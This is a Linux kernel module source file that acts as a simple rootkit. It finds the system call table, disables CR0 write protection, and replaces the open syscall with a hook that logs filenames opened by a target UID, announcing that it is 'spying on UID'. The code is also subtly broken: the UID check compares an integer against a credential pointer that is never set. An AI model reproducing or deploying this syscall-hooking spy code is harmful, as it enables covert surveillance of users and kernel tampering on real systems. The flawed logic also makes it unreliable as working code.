#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <asm/uaccess.h>

static void my_write_cr0(long value) {
  __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
#define enable_write_protection() my_write_cr0(read_cr0() | (0x10000)) 

static int uid;
module_param(uid, int, 0644);
const struct cred __rcu *real_cred;


unsigned long *sys_call_table_address;
asmlinkage int (*original_call)(const char *, int, int);

/*
cada llamada del systema tiene sus propios argumentos
analizar mejor el codigo fuente de cada llamada para
crear llamadas personalizadas ;D.  
 */

static struct kprobe kp = {
       .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
unsigned long *get_system_call_table_address(void){
         kallsyms_lookup_name_t kallsyms_lookup_name;
         register_kprobe(&kp);
         kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
         unregister_kprobe(&kp);
         unsigned long *address = (unsigned long*)kallsyms_lookup_name("sys_call_table");
         return address;
}

asmlinkage int my_sys_open(const char *filename, int flags, int mode)
{
  int i = 0;
  char ch;

  
  if (uid == real_cred) {
     printk("Opened file by %d:", uid);
     do {
         get_user(ch, filename + i);
         i++;
         printk(KERN_NOTICE "%c", ch);
     } while (ch != 0);
     printk("\n");

      
  }     
  return original_call(filename, flags, mode);
}

int init_module()
{
  sys_call_table_address = get_system_call_table_address();
  original_call = sys_call_table_address[__NR_open];
  disable_write_protection();
  sys_call_table_address[__NR_open] = my_sys_open;
  enable_write_protection();
  printk(KERN_INFO "spying on UID:%d", uid);
  return 0;
}
void cleanup_module()
{
 if (sys_call_table_address[__NR_open] != my_sys_open){
    printk(KERN_ALERT "S0meb0d1 1s be1ng a b4d b0y, st0p pl4ying");
    printk(KERN_ALERT "w1th the s1stem c4lls y0u stup1d.\n");
 }
 disable_write_protection();
 sys_call_table_address[__NR_open] = original_call;
 enable_write_protection();
}
MODULE_LICENSE("GPL");


